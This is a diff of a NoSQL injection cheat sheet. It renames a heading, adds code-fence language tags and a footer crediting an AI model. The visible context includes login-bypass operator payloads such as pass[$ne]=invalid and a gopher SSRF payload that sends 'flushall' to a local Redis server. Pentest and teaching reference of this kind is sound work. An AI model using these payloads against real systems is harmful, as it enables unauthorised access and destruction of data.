@@ -2,7 +2,7 @@
 
 #NoSQLi #NoSQL #injection #WebAppAttacks #MongoDB
 
-## What Is NoSQL Injection
+## What is this?
 
 NoSQL databases (MongoDB, Redis, CouchDB, Cassandra) don't use SQL — they use operator-based query languages. Injection occurs when user input is parsed as query operators rather than data values.
 
@@ -49,7 +49,7 @@ NoSQL databases (MongoDB, Redis, CouchDB, Cassandra) don't use SQL — they use 
 
 **Basic probes:**
 
-```
+```bash
 '
 "
 {
@@ -94,7 +94,7 @@ Normal login request:
 
 If the app uses `user=admin&pass=secret` format, inject PHP/Express array notation:
 
-```
+```bash
 # URL parameter operator injection
 user=admin&pass[$ne]=invalid
 user[$ne]=invalid&pass[$ne]=invalid
@@ -232,7 +232,7 @@ gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
 ```
 
 **Common Redis attack via SSRF:**
-```
+```bash
 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
 ```
 
@@ -261,7 +261,7 @@ curl http://target.com:5984/users/<doc_id>
 ### Case sensitivity (MongoDB operators are case-sensitive — `$NE` doesn't work)
 
 ### URL encoding operators
-```
+```text
 $ne → %24ne
 $gt → %24gt
 ```
@@ -280,7 +280,7 @@ $gt → %24gt
 
 ## Quick Reference Checklist
 
-```
+```bash
 1. Identify NoSQL indicators
    - JSON body, MongoDB errors, Mongoose in stack traces
    - URL params accepting object-like values
@@ -310,3 +310,9 @@ $gt → %24gt
    - Redis: check for SSRF + Gopher, newline injection
    - CouchDB: direct HTTP API access, Mango query injection
 ```
+
+---
+
+*Created: 2026-02-27*
+*Updated: 2026-05-13*
+*Model: claude-sonnet-4-6*
